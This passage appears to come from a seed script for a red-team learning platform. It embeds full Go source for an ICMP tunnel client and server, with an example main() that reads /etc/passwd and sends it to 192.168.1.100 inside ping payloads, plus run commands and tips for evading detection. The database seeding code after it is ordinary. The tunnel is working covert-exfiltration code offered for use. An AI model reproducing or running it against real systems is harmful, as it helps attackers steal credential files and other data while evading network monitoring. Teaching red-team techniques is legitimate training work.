type ICMPTunnel struct {
    conn      *icmp.PacketConn
    serverIP  net.IP
    sequence  uint16
}

func NewICMPTunnel(serverIP string) (*ICMPTunnel, error) {
    conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
    if err != nil {
        return nil, err
    }

    return &ICMPTunnel{
        conn:     conn,
        serverIP: net.ParseIP(serverIP),
    }, nil
}

func (t *ICMPTunnel) SendData(data []byte) error {
    // Split into chunks
    for i := 0; i < len(data); i += MaxDataSize {
        end := i + MaxDataSize
        if end > len(data) {
            end = len(data)
        }

        chunk := data[i:end]
        if err := t.sendChunk(chunk, i == 0, end >= len(data)); err != nil {
            return err
        }

        time.Sleep(100 * time.Millisecond) // Rate limit
    }

    return nil
}

func (t *ICMPTunnel) sendChunk(data []byte, isFirst, isLast bool) error {
    // Build ICMP message
    msg := icmp.Message{
        Type: ipv4.ICMPTypeEcho,
        Code: 0,
        Body: &icmp.Echo{
            ID:   os.Getpid() & 0xffff,
            Seq:  int(t.sequence),
            Data: t.encodePayload(data, isFirst, isLast),
        },
    }
    t.sequence++

    msgBytes, err := msg.Marshal(nil)
    if err != nil {
        return err
    }

    _, err = t.conn.WriteTo(msgBytes, &net.IPAddr{IP: t.serverIP})
    return err
}

func (t *ICMPTunnel) encodePayload(data []byte, isFirst, isLast bool) []byte {
    // Header: [flags (1 byte)][length (2 bytes)][data...]
    payload := make([]byte, 3+len(data))

    var flags byte
    if isFirst {
        flags |= 0x01
    }
    if isLast {
        flags |= 0x02
    }

    payload[0] = flags
    binary.BigEndian.PutUint16(payload[1:3], uint16(len(data)))
    copy(payload[3:], data)

    return payload
}

func (t *ICMPTunnel) Close() {
    t.conn.Close()
}

// Server side
type ICMPServer struct {
    conn     *icmp.PacketConn
    sessions map[string]*Session
}

type Session struct {
    data     []byte
    complete bool
}

func NewICMPServer() (*ICMPServer, error) {
    conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
    if err != nil {
        return nil, err
    }

    return &ICMPServer{
        conn:     conn,
        sessions: make(map[string]*Session),
    }, nil
}

func (s *ICMPServer) Listen() {
    buf := make([]byte, 65535)

    for {
        n, peer, err := s.conn.ReadFrom(buf)
        if err != nil {
            continue
        }

        msg, err := icmp.ParseMessage(1, buf[:n])
        if err != nil {
            continue
        }

        if echo, ok := msg.Body.(*icmp.Echo); ok {
            s.handleEcho(peer.String(), echo)
        }
    }
}

func (s *ICMPServer) handleEcho(peer string, echo *icmp.Echo) {
    if len(echo.Data) < 3 {
        return
    }

    flags := echo.Data[0]
    length := binary.BigEndian.Uint16(echo.Data[1:3])
    data := echo.Data[3 : 3+length]

    session, exists := s.sessions[peer]
    if !exists || (flags&0x01 != 0) {
        session = &Session{}
        s.sessions[peer] = session
    }

    session.data = append(session.data, data...)

    if flags&0x02 != 0 {
        // Transfer complete
        fmt.Printf("[+] Received %d bytes from %s\\n", len(session.data), peer)
        os.WriteFile(fmt.Sprintf("icmp_%s.bin", peer), session.data, 0644)
        session.complete = true
    }
}

func main() {
    // Client usage
    tunnel, _ := NewICMPTunnel("192.168.1.100")
    data, _ := os.ReadFile("/etc/passwd")
    tunnel.SendData(data)
    tunnel.Close()
}
\`\`\`

### Running (requires root)
\`\`\`bash
# Server
sudo ./icmp-tunnel server

# Client
sudo ./icmp-tunnel client -target 192.168.1.100 -file /etc/passwd
\`\`\`

### Detection Evasion
- Mimic real ping patterns
- Jitter between packets
- Use legitimate-looking payload sizes
- Respond to actual pings normally`
				}
			]
		}
	]
};

async function seed() {
	console.log('Seeding Network & Red Team path...');

	// Insert the path
	const pathResult = db.insert(schema.paths).values({
		name: networkRedteamPath.name,
		description: networkRedteamPath.description,
		color: networkRedteamPath.color,
		language: networkRedteamPath.language,
		skills: networkRedteamPath.skills,
		startHint: networkRedteamPath.startHint,
		difficulty: networkRedteamPath.difficulty,
		estimatedWeeks: networkRedteamPath.estimatedWeeks,
		schedule: networkRedteamPath.schedule
	}).returning().get();

	console.log(`Created path: ${networkRedteamPath.name}`);

	// Insert modules and tasks
	for (let i = 0; i < networkRedteamPath.modules.length; i++) {
		const mod = networkRedteamPath.modules[i];
		const moduleResult = db.insert(schema.modules).values({
			pathId: pathResult.id,
			name: mod.name,
			description: mod.description,
			orderIndex: i
		}).returning().get();

		console.log(`  Created module: ${mod.name}`);

		for (let j = 0; j < mod.tasks.length; j++) {
			const task = mod.tasks[j];
			db.insert(schema.tasks).values({
				moduleId: moduleResult.id,
				title: task.title,
				description: task.description,
				details: task.details,
				orderIndex: j,
				completed: false
			}).run();
		}
		console.log(`    Added ${mod.tasks.length} tasks`);
	}

	console.log('\\nSeeding complete!');
}

seed().catch(console.error);
